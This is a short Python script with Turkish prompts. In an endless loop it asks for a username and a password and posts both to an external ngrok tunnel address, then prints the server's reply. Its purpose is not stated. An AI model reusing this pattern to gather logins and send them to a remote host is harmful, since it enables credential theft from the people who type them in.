import requests

sunucu_ip = '188.3.5.88'  # Örn: '85.100.200.50'
url = f'https://denice-unaerated-omar.ngrok-free.dev/gonder'
while True:
 isim = input("Kullanıcı adı:")
 veri = input("Şifre:")

 payload = {
    'isim': isim,
    'veri': veri
 }

 try:
    response = requests.post(url, data=payload)
    print("Sunucu yanıtı:", response.text)
 except Exception as e:
    print("Bağlantı hatası:", e)
